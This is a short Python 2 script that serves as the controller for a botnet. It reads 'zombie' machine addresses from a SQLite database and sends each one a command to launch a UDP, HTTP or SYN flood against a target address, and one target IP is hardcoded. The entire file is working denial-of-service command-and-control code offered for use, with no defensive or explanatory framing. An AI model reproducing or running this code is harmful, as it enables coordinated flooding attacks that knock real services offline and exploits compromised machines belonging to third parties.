import socket
import time
import sys
import sqlite3 as lite

# Each zombie registers its address and an open port to send attack to
PORT = 15000
TIMEOUT = 300
TARGET = "108.179.184.95"
TARGET_PORT = 7

if len(sys.argv) < 4:
    print
    print "USAGE: {attack type} {target address} {timeout (seconds)} {# threads} {port}"
    print "Attack types: 'udp', 'http', 'syn'"
    print
    sys.exit(0)

attack = sys.argv[1].lower()
target = sys.argv[2]
timeout = sys.argv[3]
threads = sys.argv[4]
port = sys.argv[5] if len(sys.argv) > 5 else 7

con = lite.connect('addresses.db')
with con:    
    cur = con.cursor()
    low_time = int(time.time() - 300)
    cur.execute("SELECT DISTINCT ip from addresses where 'time' > {0}".format(low_time))
    zombies = cur.fetchall()
    for zombie in zombies:
        zombie = zombie[0]
        i = 0
        while i < 3:
            i = i + 1
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                data = "{0} {1} {2} {3} {4}".format(attack, target, timeout, port, threads)
                sock.connect((zombie, PORT))
                sock.sendall(data + "\n")
                rec = sock.recv(1024)
                if rec == "ACK":
                    sock.close()
                    print "Zombie: {0} initiated".format(zombie)
                    break
            except:
                print sys.exc_info()[0]
                time.sleep(3)
